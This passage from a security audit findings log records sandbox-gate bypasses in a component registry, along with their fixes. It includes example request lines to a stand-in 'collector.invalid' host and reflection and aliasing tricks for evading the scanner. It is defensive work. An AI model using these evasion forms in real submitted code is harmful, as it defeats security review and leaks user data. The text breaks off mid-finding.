**Affected code:** `packages/schemas/src/resource.ts`,

`packages/catalog/src/flatten.ts`, `scripts/build-catalog.ts`, and their

regression tests.

**Remediation:** Resource manifest and reference slugs now require canonical

lowercase kebab-case. Catalogue building returns a map from each validated

manifest object to its discovered directory, and registry generation uses that

trusted directory rather than manifest category or slug values. A regression

uses a valid category label containing `../` and verifies the source directory

remains the discovered resource folder. The fix is local and awaits deployed

review verification.

### SEC-37-062 — High — resource readers accepted symlinked roots

**Evidence:** Five regressions passed symlinked directories as the catalogue

root, an individual resource directory, the registry generator's resource

directory, and the Node export adapter's `resources` search root. The registry

case also exercises its `index.tsx` fallback when no source file spec is eligible

for packaging. Before the fix, discovery followed the external tree, validation

marked it valid, and the registry/export readers returned the external component

source. The red/green results are recorded in

`quality/evidence/step-37/resource-root-symlink-containment.json`.

**Reproduction:** Create a directory junction/symlink to a directory with a

resource manifest or `index.tsx`, then pass the linked path to the respective

resource reader. Before the fix, each boundary treated the symlink target as a

trusted resource root.

**Root cause:** The consumers canonicalized a supplied root but did not first

require the supplied root itself to be a real directory. Their inner file

containment checks therefore treated an external target as the authorized

root.

**Affected code:** `packages/catalog/src/discovery.ts`,

`packages/catalog/src/validator.ts`, `packages/registry/src/generator.ts`, and

`packages/exporter/src/node-disk-resolver.ts`.

**Remediation:** Discovery now rejects a symlinked catalogue root; validation

returns an actionable error for a symlinked or non-directory resource root;

registry generation rejects a symlinked root on both manifest-file and fallback

paths; and the Node export adapter skips symlinked/non-directory search roots.

Five red-to-green tests cover these entry points. The fixes are local and await

deployed review verification.

### SEC-37-063 — High — catalogue builds executed contributed manifest modules

**Evidence:** A hostile `manifest.js` imported
ode:fs` and wrote a marker file

during `loadManifest()`. Before the fix, catalogue loading resolved the module

and returned its schema-valid export after executing the write. The failing

red/green regression and the static-TypeScript compatibility test are recorded

in `quality/evidence/step-37/executable-manifest-isolation.json`.

**Reproduction:** Put an import and top-level `writeFileSync()` call before a

valid `export default` in a discovered `manifest.js`, then run catalogue

loading. Before the fix, the marker appeared on disk. After the fix, loading

rejects the executable module and the marker remains absent.

**Root cause:** `loadManifest()` used dynamic `import()` on any non-JSON

manifest, running contributor-controlled module initialization before Zod

validation.

**Affected code:** `packages/catalog/src/loader.ts` and

`packages/catalog/src/__tests__/catalog.test.ts`.

**Remediation:** Code-form manifests are parsed through the TypeScript AST as

plain static data. Only object literals, arrays and primitive literals are

accepted; imports, executable statements, computed values, calls and spreads

fail closed. Static `export const manifest = { ... } as const` remains

supported. A one-megabyte source cap bounds parser input. JSON catalogues remain

unchanged.

### SEC-37-064 — High — Gold artifact generation bypassed validated resource discovery

**Evidence:** A symlinked category under `resources/` pointed to an external

directory containing a component with a unique probe string. The failing

regression showed the generator read and returned that component even though

canonical catalogue discovery admitted exactly the 324 real resources and

excluded the linked category. After the fix, the generated component set does

not contain the probe. Results are recorded in

`quality/evidence/step-37/gold-artifact-resource-boundary.json`.

**Reproduction:** Add a category symlink under `resources/` that points to a

directory containing `resource/index.tsx`, then call `discoverAllComponents()`.

Before the fix, `fs.statSync()` followed the category link and imported its

source path into generated registries.

**Root cause:** `generate-gold-artifacts.ts` performed a second filesystem scan

instead of using the validated resource-directory map returned by catalogue

building. That scan followed category symlinks and admitted directories that

were absent from the validated catalogue.

**Affected code:** `scripts/generate-gold-artifacts.ts`,

`scripts/build-catalog.ts`, and `tests/security/gold-artifacts.test.ts`.

**Remediation:** Gold artifact generation now consumes the validated catalogue

directory map. Direct invocation first builds and validates the catalogue;

every mapped resource root and source file is resolved and checked for

containment, and source reads are capped at 1 MiB. The build script passes the

already-validated map, avoiding a second scan. The red-to-green regression

confirms the external probe is excluded.

### SEC-37-065 — High — manifest IDs were interpolated as executable registry keys

**Evidence:** `ResourceManifestSchema` accepts any non-empty resource ID, and a

schema-valid ID containing a quote and TypeScript expression was inserted

unescaped into `generated-gold-registry.tsx` and the preview registry. The red

test captured executable expression syntax in both outputs. After the fix, the

ID is emitted as a JSON-encoded string key. See

`quality/evidence/step-37/generated-metadata-escaping.json`.

**Reproduction:** Give `generateGoldRendererRegistry()` and

`generatePreviewsRegistry()` a component whose valid manifest ID contains a

quote followed by a TypeScript expression. Before the fix, the generated

mapping contained the expression outside a string literal.

**Root cause:** The code generator wrapped manifest IDs and resource slugs in

single quotes through string interpolation instead of serializing them as data.

**Affected code:** `scripts/generate-gold-artifacts.ts` and

`tests/security/gold-artifacts.test.ts`.

**Remediation:** Generated import specifiers, slugs, and IDs are JSON-encoded

string literals. Resource slugs and component identifiers are validated before

they are used in generated TypeScript. The regression covers both renderer and

preview registries.

### SEC-37-066 — High — non-Gold resource code was imported into the main app renderer

**Evidence:** Before the fix, the generated default renderer statically imported

324 resource implementations, including `ai-chat-panel`, although only the Gold

40 are certified for Core runtime composition. The renderer regression failed

because `DEFAULT_RESOURCE_RENDERERS['ai-chat-panel']` returned its component.

After the fix, the generated app registry imports exactly 40 Gold resources,

and the same project reference renders Tessellate's recoverable unresolved

resource diagnostic. Evidence is recorded in

`quality/evidence/step-37/gold-runtime-boundary.json`.

**Reproduction:** Render a project node referencing the canonical non-Gold

resource `ai-chat-panel` through `NodeRenderer`. Before the fix, its component

was available on the main app origin; the regression failed on the unexpected

renderer entry. After the fix, the resource is absent from the app registry and

the renderer shows its preserved-manifest recovery state.

**Root cause:** `runGenerate()` used the full validated catalogue component

list to generate the app renderer registry, despite the documented Gold 40

Core runtime boundary. Validation proved catalogue shape and containment, but

did not certify every implementation for execution in the authenticated app.

**Affected code:** `scripts/generate-gold-artifacts.ts`,

`packages/renderer/src/default-registry.tsx`,

`packages/renderer/src/__tests__/gold-registry.test.tsx`, and

`scripts/audit-security-secrets.ts`.

**Remediation:** Runtime renderer imports and accepted-prop metadata are now

generated only for the exact Gold 40 slug set. Other catalogue source remains

available to the isolated preview and as inert export source data. The security

audit checks that the main-origin renderer imports exactly the certified set;

the regression passed 52/52 tests after failing before the fix.

### SEC-37-067 — Medium — registry gate approved statically resolved remote resource requests

**Evidence:** The registry gate approved statically resolvable remote URLs

passed to JSX images, SVG images, media elements created in browser code, and

form submission targets. It also missed a remote URL exported from one source

file and imported into another. Each red regression failed because

`security-isolation` returned `pass`; each now rejects the resource. External

navigation links and local asset aliases remain accepted. Test evidence is

recorded in

`quality/evidence/step-37/registry-asset-alias-regression.json`.

**Reproduction:** Run `pnpm exec vitest run

packages/registry-gate/src/__tests__/registry-gate.test.ts -t "statically

aliased remote asset"`, or the full registry-gate test file. Before the fix,

aliased image, SVG, cross-file, media, and form cases were approved. The

registry-gate test file now passes 29/29.

**Root cause:** The security gate used regular expressions that recognized

remote URLs written directly in JSX but did not follow static string aliases,

URL objects, imports between resource files, or browser-created media and form

request sinks.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts`,

`packages/registry-gate/src/runner.ts`,

`packages/registry-gate/src/__tests__/registry-gate.test.ts`, and

`packages/registry-gate/package.json`.

**Remediation:** Parse scanned JavaScript/TypeScript source with the existing

TypeScript compiler API and resolve constant string aliases, concatenations,

template literals, URL objects, and local imports at JSX and browser API request

sinks. The gate still does not execute submitted code; external navigation

remains allowed, and the hosting preview's origin isolation and CSP remain the

runtime enforcement boundary. All 324 canonical resources now pass this

security-isolation check; this does not close the remaining broader hostile

resource audit or deployed-runtime checks.

### SEC-37-068 — Medium — registry gate allowed remote JavaScript module imports

**Evidence:** A static `import` from an HTTPS URL and a dynamic `import()` whose

URL came from a constant both passed the source-safety check before the fix.

The new regression failed before the fix and both forms are rejected now.

Evidence is recorded in

`quality/evidence/step-37/registry-remote-module-regression.json`.

**Reproduction:** Run the registry-gate test named “rejects statically declared

and dynamically imported remote modules”. Before the fix, the static module

specifier was approved; after the fix, the complete registry-gate test file

passes 29/29.

**Root cause:** The outbound-request regular expressions did not recognize

module loading syntax, which can load and execute code without calling `fetch`

or adding a script element.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts`,

`packages/registry-gate/src/__tests__/registry-gate.test.ts`, and the public CLI

admission regression in `packages/cli/src/__tests__/black-box.test.ts`.

**Remediation:** The static TypeScript scan now rejects external `import`,

`export ... from`, dynamic `import()`, and `require()` module specifiers when

their URL is statically resolvable. The source is parsed but never executed.

### SEC-37-069 — Medium — CSS URL detection misclassified JavaScript URL objects

**Evidence:** Constructing a `URL` for a normal external navigation link was

rejected as an outbound CSS asset request because the case-insensitive `url()`

pattern also matched JavaScript's
ew URL(...)`. The red regression failed

before the fix; external URL objects used for anchors now pass while remote

URL objects used as image sources remain rejected. Evidence is recorded in

`quality/evidence/step-37/registry-url-object-navigation-regression.json`.

**Reproduction:** Run the registry-gate test named “allows a URL object used

only for external navigation”. Before the fix, the link-only example returned

`fail`; it now returns `pass`.

**Root cause:** A broad, case-insensitive CSS `url(...)` regular expression

could not distinguish CSS asset syntax from the JavaScript `URL` constructor.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and

`packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Restrict the CSS URL matcher to actual `url(https://...)`

syntax and exclude JavaScript
ew URL(...)`. Static URL-object values are

instead resolved by the AST scanner at resource-loading attributes.

### SEC-37-070 — Medium — custom Link components were mistaken for native link elements

**Evidence:** The complete 324-resource security scan rejected the canonical

`resources/primitives/link` implementation because its external destinations

are passed through the capitalized React `<Link>` component. A red regression

failed before the fix; the component and test now pass. The full scan reports

zero security-isolation failures. Evidence is recorded in

`quality/evidence/step-37/registry-source-isolation-matrix.json`.

**Reproduction:** Run the test named “allows semantic external navigation

through a capitalized Link component”, then scan all `resources/*` manifests

with `runRegistryGate`. Before the fix, the `link` primitive failed the check;

after the fix, all 324 canonical resource folders pass.

**Root cause:** The JSX scanner lowercased every component identifier before

comparing it with native HTML resource tags, turning `<Link>` into `<link>`.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts`,

`packages/registry-gate/src/__tests__/registry-gate.test.ts`, and

`resources/primitives/link/preview.tsx` (test fixture only; the resource source

was not changed).

**Remediation:** Treat only lowercase JSX identifiers as native HTML tags;

preserve capitalized React component names and their documented navigation

behavior.

### SEC-37-071 — Medium — executable URL schemes passed the registry gate

**Evidence:** The scanner accepted a direct `javascript:` link and one built

from statically resolved string aliases. It also did not reject an active HTML

document embedded through a `data:` URL. Evidence is recorded in

`quality/evidence/step-37/registry-executable-url-scheme-regression.json`.

**Reproduction:** Run the registry-gate tests named “rejects executable URL

schemes in navigation attributes”, “rejects executable URL schemes resolved

through a static alias”, “rejects executable URL schemes with browser-stripped

newlines”, and “rejects active HTML documents embedded from data URLs”. The

direct and aliased cases failed to be rejected before the fix.

**Root cause:** The TypeScript AST scanner only resolved remote HTTP(S) asset

and module requests. It did not inspect executable schemes in URL attributes or

active data documents in navigation and embedding contexts.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and

`packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve URL attributes and DOM URL assignments through the

existing static-string resolver. Normalize URL-parser whitespace, reject

`javascript:` and `vbscript:`, and reject active HTML/XHTML/SVG data documents

in navigation or embedding contexts while allowing safe HTTPS and fragments.

**Validation:** The direct and aliased regressions were red before the fix. The

registry-gate suite passes 35/35 tests; its package typecheck and focused ESLint pass. The complete

canonical scan still reports 324/324 resources passing the security-isolation

check. The full check-by-check snapshot is in

`quality/evidence/step-37/registry-gate-full-matrix.json`. This local static

check does not replace deployed preview isolation/CSP verification.

### SEC-37-072 — Medium — location navigation methods bypassed URL scheme checks

**Evidence:** The registry gate accepted `window.location.assign()` and

`window.location.replace()` calls with statically resolved `javascript:` URLs,

a const/mutable alias of `window.location`, computed property access, and direct

assignment to global `location`.

The red regressions and fix evidence are recorded in

`quality/evidence/step-37/registry-navigation-method-regression.json`.

**Reproduction:** Run the registry-gate tests named “rejects executable URLs

passed to browser navigation methods” and “rejects executable navigation

through bare and aliased location references” and “rejects executable

navigation through mutable and computed location references”. Before the fix,

the browser navigation methods, aliases, computed properties, and bare global

assignment returned `pass`.

**Root cause:** The AST scanner checked URL attributes and selected DOM URL

assignments but did not inspect navigation calls on browser `location` objects.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and

`packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve arguments to `location.assign()` and

`location.replace()` on known browser location objects, then apply the same

executable and active-document scheme rules without executing resource code.

**Validation:** The navigation-method, alias/assignment, and mutable/computed

regressions were red before the fix. The suite passed 38/38 at that change;

after the subsequent document-write regression, the suite reached 39/39, and

after the image-constructor regression it passes 40/40. Package typecheck and

focused ESLint pass. The final 324-resource

source-isolation scan has zero security failures, and full local checks pass

below. Release-candidate preview and CSP verification remains open.

### SEC-37-073 — Medium — document.write markup injection passed the registry gate

**Evidence:** Direct `document.write()` and an aliased `document.writeln()` call

both returned `pass` before the fix. The regression and verification data are

in `quality/evidence/step-37/registry-document-write-regression.json`.

**Reproduction:** Run the registry-gate test named “rejects direct and aliased

document.write sinks”. Before the fix, both calls passed the source-isolation

check.

**Root cause:** The gate checked common dynamic-code and `innerHTML` sinks but

did not classify `document.write()` or `document.writeln()` as markup-writing

sinks.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and

`packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve direct, aliased, and computed browser document objects

with the TypeScript AST and reject their `write()` and `writeln()` calls without

executing submitted resource source.

**Validation:** The regression was red before the fix. The registry-gate suite

passes 39/39 tests; package typecheck and focused ESLint pass. Full local

verification also passes: 1,164 tests across 76 files, all 22 workspace

typechecks, lint with zero errors and 33 warnings, and all 16 behavioral gates

in `pnpm audit:all`. The 324-resource static source-isolation scan has zero

security failures. Runtime preview isolation and release-candidate CSP

verification remain separate gates.

### SEC-37-074 — Medium — remote image requests passed through the Image constructor

**Evidence:**
ew Image("https://collector.invalid/pixel")` returned `pass`

before the fix, despite initiating a browser request. The red-to-green record

is `quality/evidence/step-37/registry-image-constructor-regression.json`.

**Reproduction:** Run the registry-gate test named “rejects remote URLs that

start loading in the Image constructor”. It covers direct `Image`,

`window.Image`, computed and statically aliased constructors, and confirms that

local asset paths remain allowed.

**Root cause:** Remote request detection recognized
ew Image()` followed by

a `.src` assignment, but did not inspect the URL argument supplied directly to

the constructor.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and

`packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve browser image/audio constructors and static aliases in

the TypeScript AST, then reject statically known remote constructor URLs without

executing resource source.

**Validation:** The regression failed before the fix and the final focused

registry-gate suite passes 40/40. Full local verification passes 1,165 tests

across 76 files, all 22 workspace typechecks, lint with zero errors and 33

warnings, and all 16 behavioral release gates. The isolated source-gate matrix

passes all 324 resources with zero security failures. Runtime preview isolation

and deployed CSP verification remain separate gates.

### SEC-37-075 — Medium — aliased fetch calls bypassed the registry gate

**Evidence:** `const request = fetch; request("https://collector.invalid/pixel")`

returned `pass` before the fix. The red-to-green record is

`quality/evidence/step-37/registry-fetch-alias-regression.json`.

**Reproduction:** Run “rejects outbound requests through a static fetch alias”

in `packages/registry-gate/src/__tests__/registry-gate.test.ts`. It covers

global `fetch`, `window.fetch`, computed `window["fetch"]`, and a statically

bound alias.

**Root cause:** The gate matched direct `fetch(...)` text but did not resolve a

statically aliased function expression before checking its call.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and

`packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve browser fetch references and static variable aliases

with the TypeScript AST and reject calls through them without executing

submitted resource source.

**Validation:** The test failed before the fix. The focused registry-gate suite

passes 43/43, including the destructured-fetch and destructured-image alias

regressions; the full suite passes 1,168 tests across 76 files, all 22

workspace typechecks pass, lint reports zero errors and 33 warnings, and

`pnpm audit:all` passes all 16 gates. The 324-resource source-isolation scan

reports zero security failures. Runtime preview isolation and deployed CSP

verification remain separate gates.

### SEC-37-076 — Medium — aliased browser network APIs bypassed the registry gate

**Evidence:** The source-isolation check returned pass for statically aliased WebSocket, EventSource, and XMLHttpRequest constructors, an aliased Axios request method, and a request through an Axios client created by `axios.create()`. Red-to-green details are in `quality/evidence/step-37/registry-network-api-alias-regression.json`.

**Reproduction:** Run the registry-gate regression "aliased browser and HTTP client network APIs". It covers network constructors,
avigator.sendBeacon`, aliased Axios methods, and statically created Axios clients. The resource source is analyzed as syntax and is never executed.

**Root cause:** The gate resolved aliases for fetch and media APIs but did not resolve aliases for browser network constructors, beacon methods, or Axios request functions and instances.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve the relevant aliases through the TypeScript AST and reject outbound network APIs without running submitted source.

**Validation:** The constructor and Axios regressions failed before the fix. The focused suite now passes 45/45; package typecheck and focused ESLint pass. The full suite passes 1,170 tests across 76 files, all 22 workspace typechecks pass, repository lint reports zero errors and 33 warnings, and `pnpm audit:all` passes all 16 behavioral gates. A current scan passes source isolation for all 324 catalogue resources with zero failures. Runtime preview isolation and deployed gateway/CSP verification remain separate gates.

### SEC-37-077 — Medium — reflected network API access bypassed the registry gate

**Evidence:** `Reflect.get(window, 'fetch')`, `Reflect.apply(window.fetch, window, [...])`, and `Object.getOwnPropertyDescriptor(window, 'fetch')?.value` returned pass before the fix. The red-to-green record is `quality/evidence/step-37/registry-network-reflection-regression.json`.

**Reproduction:** Run "rejects reflected access to browser network APIs" in `packages/registry-gate/src/__tests__/registry-gate.test.ts`. It covers direct and computed Reflect methods, aliases of Reflect/Object methods, reflective descriptor lookup, and Reflect.construct of network or remote-asset constructors.

**Root cause:** The source gate resolved direct network calls and ordinary aliases but did not inspect statically named network capabilities accessed through reflection.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve static Reflect/Object method aliases and reject reflected access or invocation when the target/property resolves to a browser network API, Axios method, or request-capable browser constructor. Source remains syntax-only and is never executed.

**Validation:** The browser-network reflection regression failed before the fix and now passes in the full 46/46 registry-gate suite. The full unit suite passes 1,175 tests across 76 files; typecheck passes across 22 workspace packages; lint reports zero errors and 33 warnings; `pnpm audit:all` passes all 16 gates. All 324 canonical resources pass source isolation. Deployed CSP and runtime verification remain pending.

### SEC-37-078 — Medium — aliased and reflected eval/Function calls bypassed the registry gate

**Evidence:** Aliased `eval` and `Function` constructors, `Reflect.apply(eval, ...)`, `Reflect.construct(Function, ...)`, and reflected `Function` lookup returned pass before the fix. See `quality/evidence/step-37/registry-reflective-dynamic-code-regression.json`.

**Reproduction:** Run "rejects dynamic code execution through aliases and reflection" in the registry-gate suite.

**Root cause:** Dynamic-code protection matched direct source text without resolving aliases and reflection.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve aliases to `eval`/`Function` and reflective access in the TypeScript AST, rejecting execution without running the submitted source.

**Validation:** The test failed before the fix; the 50-test registry suite and 1,175-test repository suite pass. Full typecheck and lint pass, and `pnpm audit:all` passes all 16 gates. Preview CSP remains an independent control.

### SEC-37-079 — Medium — DOM mutation APIs bypassed remote resource request checks

**Evidence:** Remote image requests through `setAttribute`, `Reflect.set`, and `Object.defineProperty` returned pass. See `quality/evidence/step-37/registry-dom-resource-mutation-regression.json`.

**Reproduction:** Run "rejects remote resource URLs assigned through DOM mutation APIs".

**Root cause:** The scanner checked markup and direct property assignments but not DOM attribute mutation APIs.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve element types, resource-bearing attributes, and static URLs for these DOM mutation calls; reject remote requests without evaluating the resource.

**Validation:** The regression was red before the fix. The registry suite passes 50/50, the full suite 1,175/1,175, and all 324 resources pass the source-isolation check.

### SEC-37-080 — Medium — reflective DOM markup sinks bypassed injection checks

**Evidence:** `Reflect.apply(document.write, ...)`, `Reflect.set(..., 'innerHTML', ...)`, and descriptor writes to `outerHTML` returned pass. See `quality/evidence/step-37/registry-reflected-markup-sinks-regression.json`.

**Reproduction:** Run "rejects reflective DOM markup injection sinks".

**Root cause:** Markup checks only recognized direct calls and direct property writes.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve reflected document writers and markup property mutations in the AST and fail the contribution gate before source execution.

**Validation:** The failing regression now passes in the 50-test registry suite; repository tests, typecheck, lint, and the complete audit pass.

### SEC-37-081 — Medium — reflected URL writes bypassed executable/active-document scheme checks

**Evidence:** Reflected writes to location, iframe src, and anchor href accepted `javascript:` or active `data:text/html` URLs before the fix. Safe HTTPS navigation remains accepted. See `quality/evidence/step-37/registry-reflected-unsafe-url-regression.json`.

**Reproduction:** Run "rejects executable and active-document URLs assigned through reflection" and the safe-HTTPS assertion.

**Root cause:** URL validation covered direct assignment, navigation methods, and markup attributes but not reflected mutation APIs.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve reflected targets, URL attributes, and static values; reject executable and active-document schemes while allowing ordinary HTTPS navigation.

**Validation:** Red regressions now pass; 50/50 registry-gate tests, 1,175/1,175 unit tests, 22-package typecheck, lint, and all 16 release gates pass. The 324-resource source-isolation matrix has zero failures.

### SEC-37-082 — Medium — worker and service-worker code loading bypassed the registry isolation gate

**Evidence:** External `Worker`/`SharedWorker` constructors,
avigator.serviceWorker.register`, and remote `importScripts` calls returned pass before the fix, including statically aliased forms. See `quality/evidence/step-37/registry-worker-loading-regression.json`.

**Reproduction:** Run "rejects remote worker and service-worker code loading" in `packages/registry-gate/src/__tests__/registry-gate.test.ts`. It covers direct and aliased worker constructors, service-worker registration, and remote `importScripts` URLs. Submitted source is parsed but never executed.

**Root cause:** The registry source-isolation gate classified network request APIs but omitted worker and service-worker script-loading entry points.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve statically aliased Worker/SharedWorker constructors and service-worker/importScripts functions through the TypeScript AST, then reject active worker loading before contributor code runs.

**Validation:** The regression failed before the fix and passes in the 51/51 registry-gate suite. The current unit suite passes 1,176 tests across 76 files, typecheck passes all 22 packages, lint has zero errors and 33 warnings, `pnpm audit:all` passes all 16 behavioral gates, and the full 324-resource source-isolation scan reports zero failures. Deployed preview CSP and gateway verification remain open.

### SEC-37-083 — Medium — reflective worker API access bypassed the registry isolation gate

**Evidence:** `Reflect.construct(Reflect.get(window, 'Worker'), ...)` returned pass before the fix. The regression also covers reflected service-worker registration and remote `importScripts`, including aliases of reflection methods; all forms are rejected after the fix. See `quality/evidence/step-37/registry-reflected-worker-loading-regression.json`.

**Reproduction:** Run "rejects reflected worker and service-worker code loading" in the registry-gate suite. It covers reflected Worker/SharedWorker construction, service-worker registration, and `importScripts`, including an alias of `Reflect.apply`.

**Root cause:** Worker checks followed direct references and simple variable aliases but did not resolve reflected property reads, property descriptors, or reflected calls.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve statically named reflected API references and follow them through `Reflect.apply`/`Reflect.construct` without executing contributor code.

**Validation:** The red regression now passes; the registry suite passes 52/52, the full suite 1,177/1,177, typecheck covers 22 packages, lint reports zero errors and 33 warnings, and `pnpm audit:all` passes. A fresh scan of 324 resources reports zero security-isolation failures. Deployed preview CSP and gateway verification remain open.

### SEC-37-084 — Medium — string-based browser timers bypassed dynamic-code execution checks

**Evidence:** A global `setTimeout` call with a static source string returned pass before the fix. Timer APIs execute string arguments as code, which is equivalent to dynamic evaluation. See `quality/evidence/step-37/registry-string-timer-execution-regression.json`.

**Reproduction:** Run "rejects string-based timer code execution". It covers global and `window` timer calls, an aliased timer, and `Reflect.apply`. Ordinary function callbacks remain accepted.

**Root cause:** Dynamic-code checks covered `eval` and `Function` but not browser timer APIs that accept strings.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve direct, aliased, bound/call/apply, and reflected timer functions, then reject statically known string code arguments.

**Validation:** The red regression now passes in the 53/53 registry suite. The full suite passes 1,178 tests across 76 files; typecheck passes all 22 packages, lint has zero errors and 33 warnings, `pnpm audit:all` passes, and the 324-resource matrix reports zero security-isolation failures. Deployed preview CSP and gateway verification remain open.

### AUD-267 — Medium — preview text selection replaced field values and announced a false action

The Sites Worker browser suite caught a separate preview-host defect while exercising the security boundary. Focusing a Textarea produced “Selected [object Object]” and replaced the field value. The root cause was a universal semantic onSelect callback colliding with React’s native text-selection event. The callback is now passed only to CommandMenu, Combobox, and DropdownMenu; the Sites Worker regression verifies unchanged Input/Textarea values, no status announcement, clean console/network checks, and a working Combobox selection. See `audit/runtime-audit.json` (AUD-267), `quality/evidence/step-37/preview-native-onselect-regression.json`, and the after screenshot at `audit/evidence/step-06/after/form-interactions/textarea-no-false-action-status-1440.png`. Public review verification remains pending for Step 45.

## Verification after SEC-37-084 (2026-10-21)

The local source after SEC-37-084 passed `pnpm install --frozen-lockfile` (23 workspace projects up to date), `pnpm test` (1,178 tests across 76 files), `pnpm typecheck` (22 workspace packages), `pnpm lint` (0 errors and 33 warnings), and `pnpm audit:all` (16/16 behavioral gates, 324 resources, 717 Astro pages, Sites Worker artifact, budgets, provenance/security checks and zero dependency advisories). The registry-gate suite passed 53/53, and the 324-resource source-isolation scan reported zero security failures. Its Playwright totals predate the subsequent shell-CSP correction and are superseded by the SEC-37-085 result below.

### SEC-37-085 — Medium — public app-shell CSP allowed arbitrary inline scripts

**Evidence:** The deployed review Site returned HTTP 200 with `script-src 'self' 'unsafe-inline'` and `style-src 'self' 'unsafe-inline'` on `/`, `/explore`, `/compose`, `/workbench`, and `/r/button`. A 1440×900 Chromium probe appended a harmless script that set a window flag; it executed and produced no CSP console error. See [`live before probe`](evidence/step-37/site-shell-csp-live-probe.json), [desktop before](../audit/evidence/step-37/site-shell-csp-before-1440.png), and [mobile before](../audit/evidence/step-37/site-shell-csp-before-390.png).

**Reproduction:** Visit the public home page, append an inline script that assigns `window.__tessellateInlineProbe = true`, then read that property. The live review Site reports `true`.

**Root cause:** The Sites Worker reused a broad shell CSP rather than deriving its inline code allowlist from the canonical Astro build.

**Affected code:** `apps/sites/worker.ts`, `apps/sites/prepare-static.mjs`, and `tests/e2e/sites-preview-csp.spec.ts`.

**Remediation:** The Sites build now hashes inline scripts and `<style>` elements from all 716 public Astro pages, excluding the separately sandboxed preview route. The Worker no longer allows `unsafe-inline` for scripts or style elements; it retains a separate `style-src-attr 'unsafe-inline'` allowance required by existing React/Astro style attributes. See [`local after evidence`](../audit/evidence/step-37/site-shell-csp-local-after.json), [desktop after](../audit/evidence/step-37/site-shell-csp-after-1440.png), and [mobile after](../audit/evidence/step-37/site-shell-csp-after-390.png).

**Validation:** The red-before-fix browser regression failed against the old Worker header. After the fix, the CSP suite passed 14/14 desktop/mobile cases. A browser probe confirmed the certified shell still hydrates and an arbitrary injected inline script is blocked, with zero unexpected console errors. `pnpm test` passed 1,178 tests, `pnpm typecheck` passed all 22 packages, `pnpm lint` had zero errors and 33 existing warnings, `pnpm audit:all` passed 16/16 gates, and `pnpm test:e2e` passed 431 tests with 134 configured skips and zero failures. The current public review Site still serves the old CSP; deployment verification remains pending for Step 45, so this finding is not closed.

### SEC-37-086 — Medium — computed browser API and DOM member names bypassed registry source isolation

**Evidence:** `window["fe" + "tch"](...)`, a `const`-bound `window[method]`, computed Worker/Function constructors, `document["wri" + "te"](...)`, string timers, and computed image `src` assignments returned `pass` before the fix. A second red regression showed that conditional names such as `window[enabled ? 'fetch' : 'clearTimeout']` were also discarded by the scanner. The probes are parsed as source and never executed. See [`computed-member regression`](evidence/step-37/registry-computed-member-regression.json).

**Reproduction:** Run `pnpm test -- packages/registry-gate/src/__tests__/registry-gate.test.ts`. The added test exercises twenty-two computed, reflected, dynamic-member, DOM-factory, and assignment forms across network, worker, dynamic-code, markup, timer, and remote-resource sinks. The repeatable full catalogue check is `pnpm exec tsx quality/scripts/audit-registry-source-isolation.ts`.

**Root cause:** The shared static-member resolver recognized dot properties and direct string-literal element access only. It did not resolve literal concatenation, `const` property names, or static conditional candidates; unresolved runtime-computed and reflected calls were ignored; the source visitor also inspected only dot-property assignments, and resource-element inference followed only direct `document.createElement` calls.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve safe compile-time names, conservatively preserve an isolation-sensitive member when a static conditional has multiple outcomes, fail closed on unresolved computed or reflected browser/DOM API invocations and risky assignments, follow statically aliased/computed `document.createElement` references, and route computed element assignments through the same resource-attribute checks.

**Validation:** Red regressions failed before the fix and pass after it. The focused registry suite passes 54/54, the full unit suite passes 1,179 tests across 76 files, typecheck passes all 22 workspace packages, full lint has zero errors and 33 existing warnings, and `pnpm audit:all` passes all 16 behavioral gates. A fresh 324-resource registry scan reports 324 security-isolation passes and zero warnings/failures. No submitted source was executed. The deployed Site and broader release-candidate checks remain pending.

### SEC-37-087 — High — browser credential and persistent-storage access bypassed registry isolation

**Evidence:** The source gate accepted computed `document.cookie`, a destructured cookie getter, computed/aliased `localStorage`, `Reflect.get` and property-descriptor access,
